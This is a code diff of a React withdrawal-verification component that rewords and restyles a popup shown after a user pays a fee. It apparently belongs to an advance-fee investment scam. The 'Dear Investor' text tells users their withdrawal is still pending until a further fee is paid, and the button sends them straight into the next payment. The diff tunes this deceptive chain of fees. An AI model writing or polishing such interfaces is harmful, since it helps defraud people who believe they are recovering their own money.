@@ -185,49 +185,41 @@ export default function WithdrawVerifyCode() {
       {/* Fee Success + Next Fee Popup */}
       {feeSuccess && (
         <>
-          <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.7)', zIndex: 300 }}/>
-          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '32px 24px', width: '320px', textAlign: 'center', borderRadius: '12px', boxShadow: '0 20px 60px rgba(0,0,0,0.4)' }}>
+          <div onClick={() => setFeeSuccess(null)} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 300 }}/>
+          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '36px 28px', width: '320px', textAlign: 'center', borderRadius: '8px' }}>
             {feeSuccess.allPaid ? (
               <>
-                <div style={{ width: '56px', height: '56px', borderRadius: '50%', background: 'rgba(34,197,94,0.1)', border: '2px solid #22c55e', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
-                  <svg width='24' height='24' fill='none' stroke='#22c55e' strokeWidth='2.5' viewBox='0 0 24 24'><polyline points='20 6 9 17 4 12'/></svg>
+                <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #22c55e', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
+                  <svg width='22' height='22' fill='none' stroke='#22c55e' strokeWidth='2.5' viewBox='0 0 24 24'><polyline points='20 6 9 17 4 12'/></svg>
                 </div>
-                <div style={{ color: '#111', fontSize: '14px', fontWeight: '800', marginBottom: '8px' }}>All Fees Cleared!</div>
-                <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.7' }}>
-                  Dear Investor, your <strong>{feeSuccess.paidFee.label}</strong> has been successfully processed. All outstanding fees have been settled. You may now proceed with your withdrawal request.
+                <div style={{ color: '#111', fontSize: '14px', fontWeight: '700', marginBottom: '8px' }}>Payment Successful</div>
+                <div style={{ color: '#888', fontSize: '11px', marginBottom: '16px' }}>{feeSuccess.paidFee.label} ${parseFloat(feeSuccess.paidFee.amount || 0).toFixed(2)} paid</div>
+                <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.8' }}>
+                  All outstanding fees have been settled. Our team is now processing your withdrawal and funds will be released shortly.
                 </div>
                 <button onClick={() => { setFeeSuccess(null); handleSubmit(); }}
-                  style={{ width: '100%', padding: '12px', background: '#22c55e', border: 'none', color: 'white', fontSize: '11px', fontWeight: '700', cursor: 'pointer', borderRadius: '6px' }}>
-                  Proceed with Withdrawal →
+                  style={{ width: '100%', padding: '10px', background: '#6366f1', border: 'none', color: 'white', fontSize: '10px', fontWeight: '700', cursor: 'pointer', marginBottom: '8px' }}>
+                  Proceed with Withdrawal
                 </button>
               </>
             ) : (
               <>
-                <div style={{ width: '56px', height: '56px', borderRadius: '50%', background: 'rgba(34,197,94,0.1)', border: '2px solid #22c55e', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
-                  <svg width='24' height='24' fill='none' stroke='#22c55e' strokeWidth='2.5' viewBox='0 0 24 24'><polyline points='20 6 9 17 4 12'/></svg>
+                <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #22c55e', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
+                  <svg width='22' height='22' fill='none' stroke='#22c55e' strokeWidth='2.5' viewBox='0 0 24 24'><polyline points='20 6 9 17 4 12'/></svg>
                 </div>
-                <div style={{ color: '#22c55e', fontSize: '13px', fontWeight: '800', marginBottom: '4px' }}>✓ Fee Payment Successful</div>
-                <div style={{ color: '#111', fontSize: '12px', fontWeight: '600', marginBottom: '12px' }}>{feeSuccess.paidFee.label} — ${parseFloat(feeSuccess.paidFee.amount || 0).toFixed(2)}</div>
-                <div style={{ background: '#fef9f0', border: '1px solid #fde68a', borderRadius: '8px', padding: '14px', marginBottom: '14px', textAlign: 'left' }}>
-                  <div style={{ color: '#92400e', fontSize: '10px', fontWeight: '700', marginBottom: '6px' }}>⚠ Action Still Required</div>
-                  <div style={{ color: '#78350f', fontSize: '10px', lineHeight: '1.7' }}>
-                    Dear Investor, your <strong>{feeSuccess.paidFee.label}</strong> was successfully processed. However, your withdrawal is not yet complete. A <strong>{feeSuccess.nextFee.label}</strong> is now required to proceed.
-                  </div>
-                </div>
-                <div style={{ background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '8px', padding: '12px', marginBottom: '14px' }}>
-                  <div style={{ color: '#6366f1', fontSize: '11px', fontWeight: '700', marginBottom: '4px' }}>{feeSuccess.nextFee.label}</div>
-                  <div style={{ color: '#555', fontSize: '9px', lineHeight: '1.6', marginBottom: '8px' }}>
-                    {FEE_DESCRIPTIONS[feeSuccess.nextFee.type] || FEE_DESCRIPTIONS.processing}
-                  </div>
-                  <div style={{ color: '#ef4444', fontSize: '20px', fontWeight: '800' }}>${parseFloat(feeSuccess.nextFee.amount || 0).toFixed(2)}</div>
+                <div style={{ color: '#111', fontSize: '14px', fontWeight: '700', marginBottom: '8px' }}>Payment Successful</div>
+                <div style={{ color: '#888', fontSize: '11px', marginBottom: '16px', textAlign: 'left' }}>{feeSuccess.paidFee.label} ${parseFloat(feeSuccess.paidFee.amount || 0).toFixed(2)} paid</div>
+                <div style={{ color: '#111', fontSize: '13px', fontWeight: '700', marginBottom: '8px', textAlign: 'left' }}>Withdrawal Still Pending</div>
+                <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.8', textAlign: 'left' }}>
+                  Dear Investor, your {feeSuccess.paidFee.label} has been successfully processed and we are currently working on processing your withdrawal. However, a {feeSuccess.nextFee.label} has not yet been paid. This fee is required to complete and release your funds.
                 </div>
                 <button onClick={() => { setFeePopup(feeSuccess.nextFee); setFeeSuccess(null); }}
-                  style={{ width: '100%', padding: '12px', background: '#6366f1', border: 'none', color: 'white', fontSize: '11px', fontWeight: '700', cursor: 'pointer', borderRadius: '6px', marginBottom: '8px' }}>
-                  Pay {feeSuccess.nextFee.label} - ${parseFloat(feeSuccess.nextFee.amount || 0).toFixed(2)}
+                  style={{ width: '100%', padding: '10px', background: '#6366f1', border: 'none', color: 'white', fontSize: '10px', fontWeight: '700', cursor: 'pointer', marginBottom: '8px' }}>
+                  Why this happened
                 </button>
                 <button onClick={() => setFeeSuccess(null)}
-                  style={{ width: '100%', padding: '10px', background: 'transparent', border: '1px solid #e2e8f0', color: '#888', fontSize: '11px', cursor: 'pointer', borderRadius: '6px' }}>
-                  Pay Later
+                  style={{ width: '100%', padding: '10px', background: 'transparent', border: '1px solid #e2e8f0', color: '#888', fontSize: '10px', cursor: 'pointer' }}>
+                  Close
                 </button>
               </>
             )}
